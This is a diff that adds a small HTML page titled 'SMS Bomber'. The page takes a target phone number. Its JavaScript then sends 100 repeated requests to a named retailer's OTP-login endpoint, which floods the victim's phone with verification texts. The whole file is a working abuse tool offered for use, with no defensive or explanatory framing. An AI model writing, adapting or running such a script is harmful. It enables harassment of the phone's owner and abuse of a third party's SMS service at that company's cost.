@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Bomber</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            text-align: center;
+        }
+        .container {
+            margin-top: 100px;
+        }
+        input[type="text"] {
+            padding: 10px;
+            width: 300px;
+            margin-bottom: 10px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>SMS Bomber</h2>
+        <input type="text" id="targetNumber" placeholder="Enter target phone number"><br>
+        <button onclick="bombSMS()">Bomb SMS</button>
+    </div>
+
+    <script>
+        function bombSMS() {
+            var targetNumber = document.getElementById("targetNumber").value;
+            var numMessages = 100; // Change the number of messages as desired
+            var apiEndpoint = "http://www.jiomart.com/mst/rest/v1/session/initiate/using_mobileno_n_otp?mobile_no=" + targetNumber;
+            
+            for (var i = 0; i < numMessages; i++) {
+                sendSMS(apiEndpoint, targetNumber);
+            }
+        }
+
+        function sendSMS(apiEndpoint, targetNumber) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", apiEndpoint, true);
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    console.log("SMS sent successfully to " + targetNumber);
+                }
+            };
+            xhr.send();
+        }
+    </script>
+</body>
+</html>
